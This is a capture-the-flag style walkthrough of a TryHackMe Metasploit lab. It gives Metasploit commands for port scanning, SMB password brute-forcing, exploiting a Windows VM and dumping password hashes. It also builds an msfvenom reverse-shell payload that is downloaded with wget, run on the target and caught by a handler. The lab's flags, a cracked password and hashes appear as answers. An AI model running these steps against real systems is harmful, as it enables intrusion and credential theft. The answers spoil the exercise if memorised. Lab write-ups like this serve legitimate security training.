---
description: https://tryhackme.com/room/metasploitexploitation
---

# Metasploit: Exploitation

## Task 2 Scanning

#### How many ports are open on the target system?

```bash
msfconsole
msf > search portscan
msf > use 5
msf > setg RHOSTS 10.10.18.164
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 18-25-26.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-09 18-34-19.png>)

{% hint style="success" %}
`5`
{% endhint %}

#### Using the relevant scanner, what NetBIOS name can you see?

```bash
msf > search netbios
msf > use 2
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 18-36-28.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-09 18-37-42.png>)

{% hint style="success" %}
`ACME IT SUPPORT`
{% endhint %}

#### What is running on port 8000?

```bash
msf > search http_version
msf > use 0
msf > set RPORT 8000
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 18-41-46.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-09 18-42-40.png>)

{% hint style="success" %}
`webfs/1.21`
{% endhint %}

#### What is the "penny" user's SMB password?

```bash
msf > search smb_login
msf > use 0
msf > set SMBUser penny
msf > set PASS_FILE MetasploitWordlist.txt
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 18-44-01.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-09 19-08-53.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-09 19-09-17.png>)

{% hint style="success" %}
`leo1234`
{% endhint %}

## Task 4 Vulnerability Scanning

#### Who wrote the module that allows us to check SMTP servers for open relay?

```bash
msf > search smtp relay
msf > use 0
msf > info
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 19-25-26.png>)

{% hint style="success" %}
`Campbell Murray`
{% endhint %}

## Task 5 Exploitation

#### Exploit one of the critical vulnerabilities on the target VM

```bash
msfconsole
msf > use 0
msf > set RHOSTS 10.10.5.180
msf > set LHOST 10.6.9.176
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 19-29-26.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-09 19-33-07.png>)

#### What is the content of the flag.txt file?

```bash
meterpreter > search -d C:\\ -f flag.txt
meterpreter > cat 'C:\Users\Jon\Documents\flag.txt'
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 19-35-54.png>)

{% hint style="success" %}
`THM-5455554845`
{% endhint %}

#### What is the NTLM hash of the password of the user "pirate"?

```bash
hashdump
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 19-37-08.png>)

{% hint style="success" %}
`8ce9a3ebd1647fcc5e04025019f4b875`
{% endhint %}

## Task 6 Msfvenom

#### Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.

```bash
ssh murphy@10.10.180.250
sudo -l
sudo su -
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 20-09-29.png>)

#### Create a meterpreter payload in the .elf format.

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.6.9.176 \
         -a x86 --platform linux -f elf -o shell.elf
cp shell.elf /var/www/html
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 20-11-41.png>)

#### Transfer it to the target machine

```bash
wget http://10.6.9.176/shell.elf
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 20-13-47.png>)

#### Get a meterpreter session on the target machine.

```bash
msf > use exploit/multi/handler
msf > set payload linux/x86/meterpreter/reverse_tcp
msf > set LHOST 10.6.9.176
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 20-16-33.png>)

```bash
chmod +x shell.elf
./shell.elf
```

#### Use a post exploitation module to dump hashes of other users on the system.

```bash
msf > search hashdump
msf > use 5
msf > set SESSION 2
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 20-20-21.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-09 20-20-51.png>)

#### What is the other user's password hash?

{% hint style="success" %}
`$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0`
{% endhint %}
